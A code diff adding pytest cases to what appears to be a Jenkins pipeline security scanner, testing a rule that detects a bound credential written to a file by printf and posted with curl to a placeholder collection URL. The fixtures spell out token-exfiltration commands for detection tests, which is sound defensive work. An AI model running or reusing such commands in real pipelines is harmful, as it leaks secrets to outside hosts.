@@ -224,3 +224,48 @@ def test_mutation_skips_only_demonstrated_semantic_changes() -> None:
     assert not jk_pattern.self_test_mutation_applicable(jk_source, changed, "quote_swap")
     for mutant in mutate_whitespace_pad(jk_source):
         assert jk_pattern.self_test_mutation_applicable(jk_source, mutant, "whitespace_pad")
+
+
+@pytest.mark.parametrize(
+    ("commands", "expect_flow", "expect_incomplete"),
+    [
+        ('printf \'%s\' "$TOKEN" > token.txt', True, False),
+        ('printf "%s" public > token.txt\nprintf \'%s\' "$TOKEN" >> token.txt', True, False),
+        ('printf \'%s\' "$TOKEN" > token.txt\nprintf \'%s\' "public" > token.txt', False, False),
+        ("printf '%s' '$TOKEN' > token.txt", False, False),
+        ('printf "$FORMAT" "$TOKEN" > token.txt', False, True),
+        ('printf \'%s\' "$TOKEN" > token.txt; true', False, True),
+        ('printf \'%s\' "$(cat token.txt)" > token.txt', False, True),
+    ],
+)
+def test_jenkins_printf_file_body_profile(
+    tmp_path: Path, commands: str, expect_flow: bool, expect_incomplete: bool
+) -> None:
+    path = _jenkins(
+        tmp_path,
+        "set -eu\n" + commands + "\ncurl --data-binary @token.txt https://example.test/collect",
+    )
+    findings = scan_file(str(path), load_rules_for_platform(Platform.JENKINS))
+    selected = [finding for finding in findings if finding.rule_id == "SEC6-JK-012"]
+    assert bool(selected) is expect_flow
+    assert any(
+        finding.rule_id == "ENGINE-ERR" and "SEC6-JK-012" in finding.title
+        for finding in findings
+    ) is expect_incomplete
+    if expect_flow:
+        assert selected[0].review_needed
+        notes = " ".join(selected[0].context_notes)
+        assert "withCredentials string binding TOKEN" in notes
+        assert "printf-file-write" in notes
+        assert "http-request-body" in notes
+
+
+def test_jenkins_printf_does_not_turn_authentication_into_body_flow(tmp_path: Path) -> None:
+    path = _jenkins(
+        tmp_path,
+        'printf \'%s\' "$TOKEN" > token.txt\n'
+        'curl -H "Authorization: Bearer $TOKEN" --data status=ready https://example.test/api',
+    )
+    matches = _matches(path, Platform.JENKINS)
+    assert not matches
+    assert not isinstance(matches, IncompletePatternMatches)
